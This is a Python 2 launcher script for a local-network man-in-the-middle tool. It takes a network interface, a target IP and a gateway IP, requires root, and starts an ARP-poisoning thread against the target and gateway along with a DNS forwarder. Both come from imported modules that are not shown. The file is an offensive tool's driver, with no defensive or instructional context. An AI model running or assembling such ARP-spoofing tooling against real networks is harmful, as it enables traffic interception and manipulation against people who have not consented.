#!/usr/bin/env python2

import argparse
import os
import threading, time
import sys
import ARPPoisoner
import DNSfw as DNSforwarder
import multiprocessing

class SWRT(object):
  args = 0
  def parseArgs(self):
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", help="increase output verbosity", action="store_true")
    parser.add_argument('-i', action='store', dest='interface', help='Store the interface', required=True)
    parser.add_argument('-t', action='store', dest='target', help='Store a target IP address', required=True)
    parser.add_argument('-r', action='store', dest='gateway', help='Store the gateway IP address', required=True)
    SWRT.args = parser.parse_args()
 
  def printArgs(self):
    if SWRT.args.debug:
      print(" -- debug mode on")
    else:
      print(" -- debug mode off")
      print(" -- interface:" +  SWRT.args.interface)
      print(" -- target:" +  SWRT.args.target)
      print(" -- gateway:" +  SWRT.args.gateway)
 
 
def main():
  SWRT().parseArgs()
  SWRT().printArgs()
  DNSfw = DNSforwarder.DNSfw(SWRT.args.interface, SWRT.args.gateway)
  poisoner = ARPPoisoner.ARPPoisoner(SWRT.args.target, SWRT.args.gateway, SWRT.args.interface)
  poisoner.daemon = True
  DNSfw.daemon = True
  DNSfw.start()
  poisoner.start()
  try:
    DNSfw.join()
    poisoner.join()
  except KeyboardInterrupt:
    poisoner.stop()
    DNSfw.stop()
    DNSfw.terminate()
    poisoner.terminate()

if __name__ == '__main__':
  if os.getuid()!=0:
    print("Need root privileges to run properly; Re-run as sudo...")
    sys.exit(1)
  main()